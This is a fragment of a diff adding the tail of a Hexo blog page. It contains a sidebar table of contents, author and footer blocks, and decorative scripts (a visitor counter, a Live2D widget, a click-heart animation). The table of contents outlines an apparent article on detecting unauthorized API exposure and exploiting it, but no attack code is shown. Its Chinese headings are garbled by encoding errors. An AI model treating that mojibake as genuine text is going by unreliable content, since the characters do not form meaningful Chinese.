href="#%E6%B6%93%E5%86%A6%E2%82%AC%E4%BD%B8%E7%96%84%E9%8E%B4%E6%A8%BB%EE%97%85%E5%A8%B4-Checklist"><span class="nav-number">2.5.</span> <span class="nav-text">涓冦€佸疄鎴樻娴?Checklist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-0%E9%94%9B%E6%B0%AD%E5%AF%9A%E7%BB%BE%E5%9C%AD%E2%80%98%E7%92%81"><span class="nav-number">2.5.1.</span> <span class="nav-text">Phase 0锛氭寚绾圭‘璁?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-1%E9%94%9B%E6%B0%AB%E4%BF%8A%E9%8E%AD%EE%88%9B%E6%95%B9%E9%97%86"><span class="nav-number">2.5.2.</span> <span class="nav-text">Phase 1锛氫俊鎭敹闆?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-2%E9%94%9B%E6%B0%AD%E6%B9%AD%E9%8E%BA%E5%A0%9F%E6%BD%88-API-%E5%A6%AB%E2%82%AC%E5%A8%B4"><span class="nav-number">2.5.3.</span> <span class="nav-text">Phase 2锛氭湭鎺堟潈 API 妫€娴?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-3%E9%94%9B%E6%B0%AD%E7%B9%81%E6%90%B4%EF%B9%80%E5%9F%84%E9%90%A2"><span class="nav-number">2.5.4.</span> <span class="nav-text">Phase 3锛氭繁搴﹀埄鐢?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%8F%EE%82%A0%E2%82%AC%E4%BE%80%E6%A7%BB%E5%AF%B0%E2%80%B3%E7%BC%93%E7%92%81"><span class="nav-number">2.6.</span> <span class="nav-text">鍏€侀槻寰″缓璁?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E7%80%B5%E7%A1%85%E7%B9%8D%E7%BC%81%E5%AD%98%E6%9F%9F"><span class="nav-number">2.6.1.</span> <span class="nav-text">8.1 瀵硅繍缁存柟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E7%80%B5%E8%A7%84%E7%A5%B4%E7%92%87%E6%9B%9F%E6%9F%9F"><span class="nav-number">2.6.2.</span> <span class="nav-text">8.2 瀵规祴璇曟柟</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%84%E5%8B%B6%E7%B4%B0%E9%8F%8C%E3%83%A8%EE%87%97%E9%91%B4%E6%B0%AD%E6%B9%B0"><span class="nav-number">2.7.</span> <span class="nav-text">闄勶細鏌ヨ鑴氭湰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%8E%B5%E5%BD%92%E5%99%BA%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E5%89%BC%E9%8F%88%EE%84%8A%E7%B4%99PowerShell%E9%94%9B"><span class="nav-number">2.7.1.</span> <span class="nav-text">鎵归噺妫€娴嬭剼鏈紙PowerShell锛?</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xioku"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xioku</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Fri Feb 02 2024 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xioku</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
+</html>
+<script type="text/javascript" >
+!function(e,t,a){function n(){c(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"),o(),r()}function r(){for(var e=0;e<d.length;e++)d[e].alpha<=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText="left:"+d[e].x+"px;top:"+d[e].y+"px;opacity:"+d[e].alpha+";transform:scale("+d[e].scale+","+d[e].scale+") rotate(45deg);background:"+d[e].color+";z-index:99999");requestAnimationFrame(r)}function o(){var t="function"==typeof e.onclick&&e.onclick;e.onclick=function(e){t&&t(),i(e)}}function i(e){var a=t.createElement("div");a.className="heart",d.push({el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()}),t.body.appendChild(a)}function c(e){var a=t.createElement("style");a.type="text/css";try{a.appendChild(t.createTextNode(e))}catch(t){a.styleSheet.cssText=e}t.getElementsByTagName("head")[0].appendChild(a)}function s(){return"rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"}var d=[];e.requestAnimationFrame=function(){return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)}}(),n()}(window,document);
+</script>
+
